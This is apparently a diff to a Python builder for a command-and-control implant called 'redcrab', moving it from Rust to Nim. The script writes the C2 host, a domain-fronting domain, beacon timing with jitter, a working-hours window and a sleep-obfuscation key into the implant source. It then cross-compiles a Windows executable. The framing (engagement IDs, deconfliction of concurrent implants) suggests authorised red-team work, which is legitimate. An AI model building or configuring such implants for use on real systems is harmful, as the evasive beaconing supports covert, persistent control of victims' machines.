@@ -12,7 +12,7 @@ Prompts:
   SLEEP_KEY          (16-byte hex or blank → random)
   Engagement ID      (optional label baked into binary; blank → random UUID)
 
-Patches src/c2.rs and src/main.rs, then runs cargo build --release.
+Patches src/c2.nim and src/redcrab.nim, then runs nim c --release.
 Prints a build summary including output binary SHA-256 for engagement records.
 """
 import os, sys, re, random, subprocess, uuid, hashlib
@@ -26,6 +26,9 @@ def hex_to_bytes(s: str) -> list:
     if len(s) != 32:
         raise ValueError('SLEEP_KEY must be exactly 16 bytes (32 hex chars)')
     return [int(s[i:i+2], 16) for i in range(0, 32, 2)]
+
+def bytes_to_nim_array(b: list) -> str:
+    return ', '.join(f'0x{x:02x}\'u8' for x in b)
 
 def bytes_to_rust_array(b: list) -> str:
     return ', '.join(f'0x{x:02x}' for x in b)
@@ -84,82 +87,69 @@ def main():
     print(f'  Beacon        : {beacon} ms \u00b1{jitter}%')
     print(f'  Hours window  : {h_start:02d}:00 \u2013 {h_end:02d}:00 local')
     print(f'  Dead sleep    : {dead_s}s')
-    print(f'  SLEEP_KEY     : {bytes_to_rust_array(key_bytes)}')
+    print(f'  SLEEP_KEY     : {bytes_to_nim_array(key_bytes)}')
     print(f'  Engagement ID : {engage_id}')
     print()
 
-    # ── Patch src/c2.rs ───────────────────────────────────────────────────
-    patch_file('src/c2.rs', {
-        'NGROK_HOST_PLACEHOLDER':                    c2_host,
-        'FRONT_DOMAIN_PLACEHOLDER':                  front,
-        'pub const C2_PORT:            u16  = 443;':
-            f'pub const C2_PORT:            u16  = {port};',
-        'pub const BEACON_INTERVAL_MS: u64  = 15_000;':
-            f'pub const BEACON_INTERVAL_MS: u64  = {beacon};',
-        'pub const JITTER_PCT:         u64  = 30;':
-            f'pub const JITTER_PCT:         u64  = {jitter};',
-        'pub const BEACON_HOUR_START:  u32  = 8;':
-            f'pub const BEACON_HOUR_START:  u32  = {h_start};',
-        'pub const BEACON_HOUR_END:    u32  = 20;':
-            f'pub const BEACON_HOUR_END:    u32  = {h_end};',
-        'pub const DEAD_SLEEP_SECS:    u64  = 3600;':
-            f'pub const DEAD_SLEEP_SECS:    u64  = {dead_s};',
+    # ── Patch src/c2.nim ─────────────────────────────────────────────────
+    patch_file('src/c2.nim', {
+        'NGROK_HOST_PLACEHOLDER':   c2_host,
+        'FRONT_DOMAIN_PLACEHOLDER': front,
+        'C2_PORT*:       uint16 = 443\'u16':
+            f'C2_PORT*:       uint16 = {port}\'u16',
+        'BEACON_INTERVAL_MS*:  uint64 = 15_000\'u64':
+            f'BEACON_INTERVAL_MS*:  uint64 = {beacon}\'u64',
+        'JITTER_PCT*:          uint64 = 30\'u64':
+            f'JITTER_PCT*:          uint64 = {jitter}\'u64',
+        'BEACON_HOUR_START*:   uint32 = 8\'u32':
+            f'BEACON_HOUR_START*:   uint32 = {h_start}\'u32',
+        'BEACON_HOUR_END*:     uint32 = 20\'u32':
+            f'BEACON_HOUR_END*:     uint32 = {h_end}\'u32',
+        'DEAD_SLEEP_SECS*:     uint64 = 3600\'u64':
+            f'DEAD_SLEEP_SECS*:     uint64 = {dead_s}\'u64',
     })
 
-    # ── Patch src/main.rs — SLEEP_KEY + BUILD_ID ──────────────────────────
-    main_path = 'src/main.rs'
+    # ── Patch src/redcrab.nim — SLEEP_KEY + BUILD_ID ──────────────────────
+    main_path = 'src/redcrab.nim'
     with open(main_path, 'r', encoding='utf-8') as f:
         main_src = f.read()
 
     # SLEEP_KEY
     key_pat = re.compile(
-        r'pub const SLEEP_KEY: \[u8; 16\] = \[[\s\S]*?\];', re.MULTILINE
+        r'const SLEEP_KEY: array\[16, byte\] = \[[\s\S]*?\]', re.MULTILINE
     )
     new_key = (
-        f'pub const SLEEP_KEY: [u8; 16] = [\n'
-        f'    {bytes_to_rust_array(key_bytes[:8])},\n'
-        f'    {bytes_to_rust_array(key_bytes[8:])},\n];'
+        f'const SLEEP_KEY: array[16, byte] = [\n'
+        f'  {bytes_to_nim_array(key_bytes[:8])},\n'
+        f'  {bytes_to_nim_array(key_bytes[8:])}\n]'
     )
     main_src, n = key_pat.subn(new_key, main_src)
     if n == 0:
-        print('[warn] SLEEP_KEY pattern not found in src/main.rs')
-
-    # BUILD_ID — insert or replace
-    build_id_pat = re.compile(
-        r'pub const BUILD_ID: &str = "[^"]*";', re.MULTILINE
-    )
-    new_build_id = f'pub const BUILD_ID: &str = "{engage_id}";'
-    if build_id_pat.search(main_src):
-        main_src = build_id_pat.sub(new_build_id, main_src)
-    else:
-        # Insert after SLEEP_KEY block
-        main_src = main_src.replace(
-            'pub const PAYLOAD:',
-            f'{new_build_id}\npub const PAYLOAD:'
-        )
+        print('[warn] SLEEP_KEY pattern not found in src/redcrab.nim')
 
     with open(main_path, 'w', encoding='utf-8') as f:
         f.write(main_src)
-    print('[+] patched src/main.rs (SLEEP_KEY + BUILD_ID)')
+    print('[+] patched src/redcrab.nim (SLEEP_KEY)')
 
     # ── Compile ───────────────────────────────────────────────────────────
     print()
     print('[*] building...')
     result = subprocess.run(
-        ['cargo', 'build', '--release', '--target', 'x86_64-pc-windows-msvc'],
+        ['nim', 'c', '-d:release', '--cpu:amd64', '--os:windows',
+         '--out:redcrab.exe', 'src/redcrab.nim'],
     )
     if result.returncode != 0:
         print('[!] build failed')
         sys.exit(result.returncode)
 
-    out = 'target/x86_64-pc-windows-msvc/release/redcrab-rt.exe'
+    out = 'redcrab.exe'
     sha = sha256_file(out) if os.path.exists(out) else '(file not found)'
 
     print()
     print('=== build complete ===')
     print(f'  output   : {out}')
     print(f'  SHA-256  : {sha}')
-    print(f'  build ID : {engage_id}')
+    print(f'  engage ID: {engage_id}')
     print()
     print('  Record SHA-256 + build ID in your engagement notes.')
     print('  Use build ID to deconflict if multiple implants run concurrently.')
